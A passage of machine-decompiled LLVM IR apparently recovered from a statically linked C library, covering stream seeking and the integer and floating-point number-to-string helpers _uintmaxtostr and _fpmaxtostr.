  %v3_8051b4e = inttoptr i32 %v0_8051b46 to i16*
  store i16 %v1_8051b4e, i16* %v3_8051b4e, align 2
  br label %dec_label_pc_8051bb5

dec_label_pc_8051b53:                             ; preds = %dec_label_pc_8051b33
  %v2_8051b53 = urem i16 %v2_8051b33, 4
  %v3_8051b53 = icmp eq i16 %v2_8051b53, 0
  br i1 %v3_8051b53, label %dec_label_pc_8051b9d, label %dec_label_pc_8051b58

dec_label_pc_8051b58:                             ; preds = %dec_label_pc_8051b53
  %v2_8051b58 = and i32 %v3_8051b33, 4
  %v3_8051b58 = icmp eq i32 %v2_8051b58, 0
  %v1_8051b5b = icmp eq i1 %v3_8051b58, false
  br i1 %v1_8051b5b, label %dec_label_pc_8051b89, label %dec_label_pc_8051b5d

dec_label_pc_8051b5d:                             ; preds = %dec_label_pc_8051b58
  %v1_8051b5d = add i32 %v0_8051b7c, 20
  %v2_8051b5d = inttoptr i32 %v1_8051b5d to i32*
  %v3_8051b5d = load i32, i32* %v2_8051b5d, align 4
  store i32 %v3_8051b5d, i32* %eax.global-to-local, align 4
  %v2_8051b60 = add i32 %v0_8051b7c, 16
  %v3_8051b60 = inttoptr i32 %v2_8051b60 to i32*
  %v4_8051b60 = load i32, i32* %v3_8051b60, align 4
  %v15_8051b60 = icmp eq i32 %v3_8051b5d, %v4_8051b60
  %v1_8051b63 = icmp eq i1 %v15_8051b60, false
  br i1 %v1_8051b63, label %dec_label_pc_8051b6a, label %dec_label_pc_8051b65

dec_label_pc_8051b65:                             ; preds = %dec_label_pc_8051b5d
  %v2_8051b65 = and i32 %v3_8051b33, 2
  %v3_8051b65 = icmp eq i32 %v2_8051b65, 0
  br i1 %v3_8051b65, label %dec_label_pc_8051b89, label %dec_label_pc_8051b6a

dec_label_pc_8051b6a:                             ; preds = %dec_label_pc_8051b65, %dec_label_pc_8051b5d
  %v1_8051b6a = and i32 %v3_8051b33, 1024
  store i32 %v1_8051b6a, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_8051b6a, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_8051b7d = call i32 @__GI_fseek(i32 %v0_8051b7c, i32 0, i32 %tmp16, i32 %v1_8051b6a)
  store i32 %v5_8051b7d, i32* %eax.global-to-local, align 4
  %v1_8051b85 = icmp eq i32 %v5_8051b7d, 0
  %v1_8051b87 = icmp eq i1 %v1_8051b85, false
  br i1 %v1_8051b87, label %dec_label_pc_8051b46, label %dec_label_pc_8051b6a.dec_label_pc_8051b89_crit_edge

dec_label_pc_8051b6a.dec_label_pc_8051b89_crit_edge: ; preds = %dec_label_pc_8051b6a
  %v0_8051b89.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b89

dec_label_pc_8051b89:                             ; preds = %dec_label_pc_8051b6a.dec_label_pc_8051b89_crit_edge, %dec_label_pc_8051b65, %dec_label_pc_8051b58
  %v2_8051b8e = phi i32 [ %v0_8051b89.pre, %dec_label_pc_8051b6a.dec_label_pc_8051b89_crit_edge ], [ %v0_8051b7c, %dec_label_pc_8051b65 ], [ %v0_8051b7c, %dec_label_pc_8051b58 ]
  %v1_8051b89 = inttoptr i32 %v2_8051b8e to i32*
  %v2_8051b89 = load i32, i32* %v1_8051b89, align 4
  %v1_8051b8b = and i32 %v2_8051b89, -4
  store i32 %v1_8051b8b, i32* %eax.global-to-local, align 4
  %v1_8051b8e = trunc i32 %v1_8051b8b to i16
  %v3_8051b8e = inttoptr i32 %v2_8051b8e to i16*
  store i16 %v1_8051b8e, i16* %v3_8051b8e, align 2
  %v0_8051b91 = load i32, i32* @ebx, align 4
  %v1_8051b91 = add i32 %v0_8051b91, 8
  %v2_8051b91 = inttoptr i32 %v1_8051b91 to i32*
  %v3_8051b91 = load i32, i32* %v2_8051b91, align 4
  store i32 %v3_8051b91, i32* %eax.global-to-local, align 4
  %v2_8051b94 = add i32 %v0_8051b91, 24
  %v3_8051b94 = inttoptr i32 %v2_8051b94 to i32*
  store i32 %v3_8051b91, i32* %v3_8051b94, align 4
  %v0_8051b97 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b97 = load i32, i32* @ebx, align 4
  %v2_8051b97 = add i32 %v1_8051b97, 16
  %v3_8051b97 = inttoptr i32 %v2_8051b97 to i32*
  store i32 %v0_8051b97, i32* %v3_8051b97, align 4
  %v0_8051b9a = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b9a = load i32, i32* @ebx, align 4
  %v2_8051b9a = add i32 %v1_8051b9a, 20
  %v3_8051b9a = inttoptr i32 %v2_8051b9a to i32*
  store i32 %v0_8051b9a, i32* %v3_8051b9a, align 4
  %v0_8051b9d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b9d

dec_label_pc_8051b9d:                             ; preds = %dec_label_pc_8051b53, %dec_label_pc_8051b89
  %v2_8051ba4 = phi i32 [ %v0_8051b7c, %dec_label_pc_8051b53 ], [ %v0_8051b9d.pre, %dec_label_pc_8051b89 ]
  %v1_8051b9d = inttoptr i32 %v2_8051ba4 to i32*
  %v2_8051b9d = load i32, i32* %v1_8051b9d, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8051ba1 = or i32 %v2_8051b9d, 64
  store i32 %v1_8051ba1, i32* %eax.global-to-local, align 4
  %v1_8051ba4 = trunc i32 %v1_8051ba1 to i16
  %v3_8051ba4 = inttoptr i32 %v2_8051ba4 to i16*
  store i16 %v1_8051ba4, i16* %v3_8051ba4, align 2
  %v0_8051ba7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba7 = urem i32 %v0_8051ba7, 65536
  store i32 %v1_8051ba7, i32* %eax.global-to-local, align 4
  %v3_8051baa = and i32 %v0_8051ba7, 2816
  %v4_8051baa = icmp eq i32 %v3_8051baa, 0
  %v1_8051bad = icmp eq i1 %v4_8051baa, false
  br i1 %v1_8051bad, label %dec_label_pc_8051bb5, label %dec_label_pc_8051baf

dec_label_pc_8051baf:                             ; preds = %dec_label_pc_8051b9d
  %v0_8051baf = load i32, i32* @ebx, align 4
  %v1_8051baf = add i32 %v0_8051baf, 12
  %v2_8051baf = inttoptr i32 %v1_8051baf to i32*
  %v3_8051baf = load i32, i32* %v2_8051baf, align 4
  store i32 %v3_8051baf, i32* %eax.global-to-local, align 4
  %v2_8051bb2 = add i32 %v0_8051baf, 28
  %v3_8051bb2 = inttoptr i32 %v2_8051bb2 to i32*
  store i32 %v3_8051baf, i32* %v3_8051bb2, align 4
  br label %dec_label_pc_8051bb5

dec_label_pc_8051bb5:                             ; preds = %dec_label_pc_8051b9d, %dec_label_pc_8051b46, %dec_label_pc_8051baf
  %v0_8051bb5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051bb5, i32* %eax.global-to-local, align 4
  %v2_8051bb7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051bb7, i32* @edx, align 4
  store i32 %v0_8051b14, i32* @ebx, align 4
  ret i32 %v0_8051bb5

; uselistorder directives
  uselistorder i32 %v0_8051ba7, { 1, 0 }
  uselistorder i32 %v1_8051b6a, { 1, 0, 2 }
  uselistorder i32 %v0_8051b7c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8051b20, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051b14, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 1024, { 0, 30, 2, 4, 3, 31, 6, 5, 1, 7, 8, 32, 33, 34, 35, 9, 36, 37, 18, 19, 15, 20, 16, 21, 17, 22, 23, 14, 24, 25, 13, 26, 27, 12, 28, 11, 29, 10, 38, 39 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051bb5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b9d, { 1, 0 }
  uselistorder label %dec_label_pc_8051b33, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8051bbc = icmp slt i32 %tmp5, 0
  %v3_8051bed = and i32 %tmp4, 2048
  %v4_8051bed = icmp eq i32 %v3_8051bed, 0
  br i1 %v5_8051bbc, label %dec_label_pc_8051bed, label %dec_label_pc_8051bcb

dec_label_pc_8051bcb:                             ; preds = %entry
  %v1_8051bce = icmp eq i1 %v4_8051bed, false
  br i1 %v1_8051bce, label %dec_label_pc_8051bf2, label %dec_label_pc_8051bd0

dec_label_pc_8051bd0:                             ; preds = %dec_label_pc_8051bcb
  %v6_8051bd0 = icmp eq i32 %tmp4, 256
  %v1_8051bd6 = inttoptr i32 %tmp to i32*
  %v2_8051bd6 = load i32, i32* %v1_8051bd6, align 4
  %v1_8051bd8 = icmp eq i1 %v6_8051bd0, false
  br i1 %v1_8051bd8, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bda

dec_label_pc_8051bda:                             ; preds = %dec_label_pc_8051bd0
  %v1_8051bda = urem i32 %v2_8051bd6, 256
  br label %dec_label_pc_8051bea

dec_label_pc_8051bdf:                             ; preds = %dec_label_pc_8051bd0
  %v6_8051bdf = icmp eq i32 %tmp4, 512
  %v1_8051be5 = icmp eq i1 %v6_8051bdf, false
  br i1 %v1_8051be5, label %dec_label_pc_8051bea, label %dec_label_pc_8051be7

dec_label_pc_8051be7:                             ; preds = %dec_label_pc_8051bdf
  %v1_8051be7 = urem i32 %v2_8051bd6, 65536
  br label %dec_label_pc_8051bea

dec_label_pc_8051bea:                             ; preds = %dec_label_pc_8051bdf, %dec_label_pc_8051bda, %dec_label_pc_8051be7
  %v0_8051bec = phi i32 [ %v2_8051bd6, %dec_label_pc_8051bdf ], [ %v1_8051bda, %dec_label_pc_8051bda ], [ %v1_8051be7, %dec_label_pc_8051be7 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8051bec

dec_label_pc_8051bed:                             ; preds = %entry
  br i1 %v4_8051bed, label %dec_label_pc_8051bf8, label %dec_label_pc_8051bf2

dec_label_pc_8051bf2:                             ; preds = %dec_label_pc_8051bed, %dec_label_pc_8051bcb
  %v1_8051bf2 = add i32 %tmp, 4
  %v2_8051bf2 = inttoptr i32 %v1_8051bf2 to i32*
  %v3_8051bf2 = load i32, i32* %v2_8051bf2, align 4
  store i32 %v3_8051bf2, i32* @edx, align 4
  %v1_8051bf5 = inttoptr i32 %tmp to i32*
  %v2_8051bf5 = load i32, i32* %v1_8051bf5, align 4
  ret i32 %v2_8051bf5

dec_label_pc_8051bf8:                             ; preds = %dec_label_pc_8051bed
  %v6_8051bf8 = icmp eq i32 %tmp4, 256
  %v1_8051bfe = inttoptr i32 %tmp to i32*
  %v2_8051bfe = load i32, i32* %v1_8051bfe, align 4
  %v1_8051c00 = icmp eq i1 %v6_8051bf8, false
  br i1 %v1_8051c00, label %dec_label_pc_8051c07, label %dec_label_pc_8051c02

dec_label_pc_8051c02:                             ; preds = %dec_label_pc_8051bf8
  %v1_8051c02 = mul i32 %v2_8051bfe, 16777216
  %v2_8051c02 = sdiv i32 %v1_8051c02, 16777216
  br label %dec_label_pc_8051c10

dec_label_pc_8051c07:                             ; preds = %dec_label_pc_8051bf8
  %v6_8051c07 = icmp eq i32 %tmp4, 512
  %v1_8051c0d = icmp eq i1 %v6_8051c07, false
  br i1 %v1_8051c0d, label %dec_label_pc_8051c10, label %dec_label_pc_8051c0f

dec_label_pc_8051c0f:                             ; preds = %dec_label_pc_8051c07
  %v1_8051c0f = mul i32 %v2_8051bfe, 65536
  %v2_8051c0f = sdiv i32 %v1_8051c0f, 65536
  br label %dec_label_pc_8051c10

dec_label_pc_8051c10:                             ; preds = %dec_label_pc_8051c07, %dec_label_pc_8051c02, %dec_label_pc_8051c0f
  %v0_8051c10 = phi i32 [ %v2_8051bfe, %dec_label_pc_8051c07 ], [ %v2_8051c02, %dec_label_pc_8051c02 ], [ %v2_8051c0f, %dec_label_pc_8051c0f ]
  %v1_8051c10 = ashr i32 %v0_8051c10, 31
  store i32 %v1_8051c10, i32* @edx, align 4
  ret i32 %v0_8051c10

; uselistorder directives
  uselistorder i32 %v0_8051c10, { 1, 0 }
  uselistorder i32 %v2_8051bfe, { 2, 0, 1 }
  uselistorder i32 %v2_8051bd6, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8 }
  uselistorder label %dec_label_pc_8051c10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051bea, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051c14 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c14, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8051c19 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8051c19, i32* %ebx.global-to-local, align 4
  %v4_8051c1d = trunc i32 %tmp4 to i16
  %v6_8051c25 = icmp eq i32 %tmp6, 256
  %v1_8051c2b = icmp eq i1 %v6_8051c25, false
  br i1 %v1_8051c2b, label %dec_label_pc_8051c31, label %dec_label_pc_8051c2d

dec_label_pc_8051c2d:                             ; preds = %entry
  %v2_8051c2d = trunc i32 %tmp4 to i8
  %v4_8051c2d = bitcast i16* %tmp5 to i8*
  store i8 %v2_8051c2d, i8* %v4_8051c2d, align 1
  br label %dec_label_pc_8051c4f

dec_label_pc_8051c31:                             ; preds = %entry
  %v6_8051c31 = icmp eq i32 %tmp6, 2048
  %v1_8051c37 = icmp eq i1 %v6_8051c31, false
  br i1 %v1_8051c37, label %dec_label_pc_8051c40, label %dec_label_pc_8051c39

dec_label_pc_8051c39:                             ; preds = %dec_label_pc_8051c31
  %sext2 = mul i32 %tmp4, 65536
  %v1_8051c39 = sdiv i32 %sext2, 65536
  %v3_8051c39 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051c39, i32* %v3_8051c39, align 4
  %v0_8051c3b = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c3b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051c3b = add i32 %v1_8051c3b, 4
  %v3_8051c3b = inttoptr i32 %v2_8051c3b to i32*
  store i32 %v0_8051c3b, i32* %v3_8051c3b, align 4
  br label %dec_label_pc_8051c4f

dec_label_pc_8051c40:                             ; preds = %dec_label_pc_8051c31
  %v6_8051c40 = icmp eq i32 %tmp6, 512
  %v1_8051c46 = icmp eq i1 %v6_8051c40, false
  br i1 %v1_8051c46, label %dec_label_pc_8051c4d, label %dec_label_pc_8051c48

dec_label_pc_8051c48:                             ; preds = %dec_label_pc_8051c40
  store i16 %v4_8051c1d, i16* %tmp5, align 2
  br label %dec_label_pc_8051c4f

dec_label_pc_8051c4d:                             ; preds = %dec_label_pc_8051c40
  %sext3 = mul i32 %tmp4, 65536
  %v1_8051c4d = sdiv i32 %sext3, 65536
  %v3_8051c4d = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051c4d, i32* %v3_8051c4d, align 4
  br label %dec_label_pc_8051c4f

dec_label_pc_8051c4f:                             ; preds = %dec_label_pc_8051c48, %dec_label_pc_8051c39, %dec_label_pc_8051c2d, %dec_label_pc_8051c4d
  %v2_8051c4f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051c4f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8051c50 = sdiv i32 %sext, 65536
  ret i32 %v1_8051c50

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 5, 3, 4 }
  uselistorder label %dec_label_pc_8051c4f, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8051c5f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c5f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8051c6b = icmp slt i32 %arg4, 0
  %v1_8051c6d = icmp eq i1 %v2_8051c6b, false
  br i1 %v1_8051c6d, label %dec_label_pc_8051c8e, label %dec_label_pc_8051c6f

dec_label_pc_8051c6f:                             ; preds = %entry
  %v1_8051c6f = sub i32 0, %arg4
  store i32 %v1_8051c6f, i32* %esi.global-to-local, align 4
  %v2_8051c71 = icmp slt i32 %arg3, 0
  %v1_8051c73 = icmp eq i1 %v2_8051c71, false
  br i1 %v1_8051c73, label %dec_label_pc_8051c8e, label %dec_label_pc_8051c75

dec_label_pc_8051c75:                             ; preds = %dec_label_pc_8051c6f
  %v1_8051c75 = sub i32 0, %arg2
  %v5_8051c75 = icmp ne i32 %arg2, 0
  store i32 %v1_8051c75, i32* %ecx.global-to-local, align 4
  %v2_8051c77 = zext i1 %v5_8051c75 to i32
  %v3_8051c77 = add i32 %v2_8051c77, %arg3
  %v1_8051c7a = sub i32 0, %v3_8051c77
  store i32 %v1_8051c7a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c8e

dec_label_pc_8051c8e:                             ; preds = %entry, %dec_label_pc_8051c6f, %dec_label_pc_8051c75
  %v0_8051c93 = phi i32 [ %v1_8051c6f, %dec_label_pc_8051c75 ], [ %v1_8051c6f, %dec_label_pc_8051c6f ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8051c75 ], [ 0, %dec_label_pc_8051c6f ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8051c93
  %tmp30 = urem i32 -1, %v0_8051c93
  store i8 0, i8* %arg1, align 1
  %v1_8051c98 = add i32 %tmp30, 1
  %v1_8051c99 = load i32, i32* %esi.global-to-local, align 4
  %v12_8051c99 = icmp eq i32 %v1_8051c98, %v1_8051c99
  %v1_8051ca3 = icmp eq i1 %v12_8051c99, false
  br i1 %v1_8051ca3, label %dec_label_pc_8051cb2, label %dec_label_pc_8051ca5

dec_label_pc_8051ca5:                             ; preds = %dec_label_pc_8051c8e
  %v1_8051ca5 = add i32 %div, 1
  br label %dec_label_pc_8051cb2

dec_label_pc_8051cb2:                             ; preds = %dec_label_pc_8051c8e, %dec_label_pc_8051ca5
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051c98, %dec_label_pc_8051c8e ], [ 0, %dec_label_pc_8051ca5 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8051c8e ], [ %v1_8051ca5, %dec_label_pc_8051ca5 ]
  %v0_8051cb2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051cb2, i32* %ebp.global-to-local, align 4
  %v0_8051cb4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051cb4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051cb8

dec_label_pc_8051cb8:                             ; preds = %dec_label_pc_8051d06, %dec_label_pc_8051cb2
  %v0_8051cef = phi i32 [ %v0_8051d08, %dec_label_pc_8051d06 ], [ %v0_8051cb2, %dec_label_pc_8051cb2 ]
  %v0_8051cbc = phi i32 [ %v1_8051d0a, %dec_label_pc_8051d06 ], [ %v0_8051cb4, %dec_label_pc_8051cb2 ]
  %v1_8051cb8 = icmp eq i32 %v0_8051cbc, 0
  br i1 %v1_8051cb8, label %dec_label_pc_8051cef, label %dec_label_pc_8051cbc

dec_label_pc_8051cbc:                             ; preds = %dec_label_pc_8051cb8
  %v0_8051cc0 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8051cbc, %v0_8051cc0
  %tmp31 = urem i32 %v0_8051cbc, %v0_8051cc0
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8051cef, %v0_8051cc0
  %tmp32 = urem i32 %v0_8051cef, %v0_8051cc0
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8051cd3 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8051cd7 = add i32 %tmp32, %v6_8051cd3
  %v8_8051cdd = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8051ce2 = add i32 %div7, %v8_8051cdd
  store i32 %v2_8051ce2, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8051cd7, %v0_8051cc0
  %tmp33 = urem i32 %v2_8051cd7, %v0_8051cc0
  %v2_8051cea = add i32 %div8, %v2_8051ce2
  br label %dec_label_pc_8051cf7

dec_label_pc_8051cef:                             ; preds = %dec_label_pc_8051cb8
  %v0_8051cf3 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8051cef, %v0_8051cf3
  %tmp34 = urem i32 %v0_8051cef, %v0_8051cf3
  br label %dec_label_pc_8051cf7

dec_label_pc_8051cf7:                             ; preds = %dec_label_pc_8051cbc, %dec_label_pc_8051cef
  %v13_8051cfd = phi i32 [ %tmp33, %dec_label_pc_8051cbc ], [ %tmp34, %dec_label_pc_8051cef ]
  %storemerge = phi i32 [ %v2_8051cea, %dec_label_pc_8051cbc ], [ %div10, %dec_label_pc_8051cef ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8051cf7 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051cf7 = add i32 %v0_8051cf7, -1
  store i32 %v1_8051cf7, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8051cfd, 10
  br i1 %tmp, label %dec_label_pc_8051cfd, label %dec_label_pc_8051d02

dec_label_pc_8051cfd:                             ; preds = %dec_label_pc_8051cf7
  %v2_8051cfd = add i32 %v13_8051cfd, 48
  %v12_8051cfd = and i32 %v2_8051cfd, 255
  %v14_8051cfd = and i32 %v13_8051cfd, -256
  %v15_8051cfd = or i32 %v12_8051cfd, %v14_8051cfd
  br label %dec_label_pc_8051d06

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cf7
  %v6_8051d02 = add i32 %v13_8051cfd, %arg5
  %v21_8051d02 = and i32 %v6_8051d02, 255
  %v23_8051d02 = and i32 %v13_8051cfd, -256
  %v24_8051d02 = or i32 %v21_8051d02, %v23_8051d02
  br label %dec_label_pc_8051d06

dec_label_pc_8051d06:                             ; preds = %dec_label_pc_8051cfd, %dec_label_pc_8051d02
  %storemerge9 = phi i32 [ %v15_8051cfd, %dec_label_pc_8051cfd ], [ %v24_8051d02, %dec_label_pc_8051d02 ]
  %v1_8051d06 = trunc i32 %storemerge9 to i8
  %v3_8051d06 = inttoptr i32 %v1_8051cf7 to i8*
  store i8 %v1_8051d06, i8* %v3_8051d06, align 1
  %v0_8051d08 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051d0a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d0a = or i32 %v1_8051d0a, %v0_8051d08
  %v3_8051d0a = icmp eq i32 %v2_8051d0a, 0
  %v1_8051d0c = icmp eq i1 %v3_8051d0a, false
  br i1 %v1_8051d0c, label %dec_label_pc_8051cb8, label %dec_label_pc_8051d0e

dec_label_pc_8051d0e:                             ; preds = %dec_label_pc_8051d06
  %v4_8051d0e = icmp eq i32 %storemerge11, 0
  br i1 %v4_8051d0e, label %dec_label_pc_8051d19, label %dec_label_pc_8051d15

dec_label_pc_8051d15:                             ; preds = %dec_label_pc_8051d0e
  %v0_8051d15 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d15 = add i32 %v0_8051d15, -1
  store i32 %v1_8051d15, i32* %edi.global-to-local, align 4
  %v1_8051d16 = inttoptr i32 %v1_8051d15 to i8*
  store i8 45, i8* %v1_8051d16, align 1
  br label %dec_label_pc_8051d19

dec_label_pc_8051d19:                             ; preds = %dec_label_pc_8051d0e, %dec_label_pc_8051d15
  %v0_8051d1c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051d1c

; uselistorder directives
  uselistorder i32 %v13_8051cfd, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8051cd7, { 1, 0 }
  uselistorder i32 %v0_8051cc0, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8051cbc, { 1, 0, 2 }
  uselistorder i32 %v0_8051cef, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051c98, { 1, 0 }
  uselistorder i32 %v0_8051c93, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 255, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d19, { 1, 0 }
  uselistorder label %dec_label_pc_8051d06, { 1, 0 }
  uselistorder label %dec_label_pc_8051cf7, { 1, 0 }
  uselistorder label %dec_label_pc_8051cb2, { 1, 0 }
  uselistorder label %dec_label_pc_8051c8e, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_4()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_9()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051d25 = load i32, i32* @edi, align 4
  %v0_8051d26 = load i32, i32* @esi, align 4
  %v0_8051d27 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d27, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8051d3c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8051d3c = add i3 %v4_8051d3c, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8051d3c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8051d43 = add i32 %tmp156, 4
  %v2_8051d43 = inttoptr i32 %v1_8051d43 to i32*
  %v3_8051d43 = load i32, i32* %v2_8051d43, align 4
  store i32 %v3_8051d43, i32* %eax.global-to-local, align 4
  %v1_8051d4a = add i32 %tmp156, 8
  %v2_8051d4a = inttoptr i32 %v1_8051d4a to i8*
  %v3_8051d4a = load i8, i8* %v2_8051d4a, align 1
  %v4_8051d4a = zext i8 %v3_8051d4a to i32
  %v6_8051d4a = and i32 %v0_8051d27, -256
  %v7_8051d4a = or i32 %v4_8051d4a, %v6_8051d4a
  store i32 %v7_8051d4a, i32* %ebx.global-to-local, align 4
  %v1_8051d4d = inttoptr i32 %tmp156 to i32*
  %v2_8051d4d = load i32, i32* %v1_8051d4d, align 4
  store i32 %v2_8051d4d, i32* %ebp.global-to-local, align 4
  %v2_8051d59 = or i8 %v3_8051d4a, 32
  %v7_8051d59 = zext i8 %v2_8051d59 to i32
  %v9_8051d59 = and i32 %v3_8051d43, -256
  %v10_8051d59 = or i32 %v7_8051d59, %v9_8051d59
  store i32 %v10_8051d59, i32* %eax.global-to-local, align 4
  %v10_8051d5b = icmp eq i8 %v2_8051d59, 97
  %v1_8051d61 = icmp eq i1 %v10_8051d5b, false
  br i1 %v1_8051d61, label %dec_label_pc_8051d6a, label %dec_label_pc_8051d63

dec_label_pc_8051d63:                             ; preds = %entry
  %v2_8051d63 = add i8 %v3_8051d4a, 6
  %v15_8051d63 = zext i8 %v2_8051d63 to i32
  %v18_8051d63 = or i32 %v15_8051d63, %v6_8051d4a
  store i32 %v18_8051d63, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051d6a

dec_label_pc_8051d6a:                             ; preds = %entry, %dec_label_pc_8051d63
  %stack_var_-207.0 = phi i8 [ %v3_8051d4a, %entry ], [ %v2_8051d63, %dec_label_pc_8051d63 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8051d71 = icmp slt i32 %v2_8051d4d, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8051d80 = select i1 %v2_8051d71, i32 6, i32 %v2_8051d4d
  store i32 %v3_8051d80, i32* %ebp.global-to-local, align 4
  %v1_8051d83 = add i32 %tmp156, 12
